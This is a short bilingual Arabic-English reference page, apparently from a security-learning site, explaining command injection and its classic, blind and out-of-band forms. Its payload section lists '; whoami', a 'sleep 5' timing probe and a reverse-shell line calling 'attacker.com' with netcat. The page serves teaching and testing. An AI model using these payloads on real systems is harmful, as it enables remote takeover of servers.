حقن الأوامر — تنفيذ الأكواد عن بعد (RCE)

Command Injection — RCE via Input

CRITICAL OWASP A03
AR

Command Injection ثغرة بالغة الخطورة تحدث عندما يقوم التطبيق بتمرير مدخلات المستخدم مباشرة ليتم تنفيذها كأوامر في نظام التشغيل (OS System Shell) دون فحص أو عزل سليم. يتيح هذا للمهاجم تنفيذ أي أوامر يرغب فيها والسيطرة الكاملة على السيرفر (RCE).

EN

Command Injection is a critical vulnerability that occurs when an application passes unsafe user-supplied data to a system shell. The operating system executes this data as commands, allowing the attacker to achieve full Remote Code Execution (RCE).

أنواع حقن الأوامر / Vulnerability Types

Classic Command Injection

مخرجات نظام التشغيل تظهر مباشرة للمستخدم في استجابة صفحة الويب.

Blind Command Injection

المخرجات لا تظهر في الاستجابة. يتطلب الكشف عنها إحداث تأخير زمني (Time Delay) مثل sleep 5.

Out-of-Band (OOB) Injection

إجبار السيرفر على إرسال المخرجات لخادم خارجي يتحكم فيه المهاجم عبر بروتوكولات مثل DNS أو HTTP.

أوامر الاختبار والـ Payloads الحية / Commmand Injection Payloads

; whoami

# Reverse shell payload
; nc -e /bin/sh attacker.com 4444

# Automated testing with Commix
